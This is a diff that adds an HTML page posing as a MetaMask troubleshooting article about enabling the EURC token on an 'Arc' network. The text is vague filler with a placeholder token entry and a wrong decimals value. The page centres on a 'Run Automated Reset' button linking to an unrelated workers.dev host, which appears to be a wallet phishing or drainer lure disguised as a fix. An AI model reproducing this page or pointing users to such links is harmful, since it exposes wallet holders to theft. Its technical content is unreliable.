@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Unable To Toggle Eurc Token On Arc Netwo</title>
+<style>
+    body {
+        font-family: sans-serif;
+        background: #0a0c10;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: none;
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    .btn {
+        background: #cf6679;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>The Metamask extension is unable to toggle the EURC token on the Arc network, resulting in the token being constantly disabled.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a compatibility issue between the Metamask extension and the Arc network, causing the token toggle functionality to malfunction.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Try resetting the Metamask extension to its default settings to resolve any configuration issues.</li>
+<li>Manually add the EURC token to the Metamask extension using the token's contract address.</li>
+<li>Update the Metamask extension to the latest version to ensure compatibility with the Arc network.</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;tokenAddress&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...EURC_TOKEN_CONTRACT_ADDRESS&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tokenSymbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;EURC&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tokenDecimal&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console for further debugging and to verify the token's contract address.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured on the browser</li>
+<li>Arc network added to the Metamask extension</li>
+<li>EURC token contract address available for manual addition</li>
+</ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=ZXRo" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
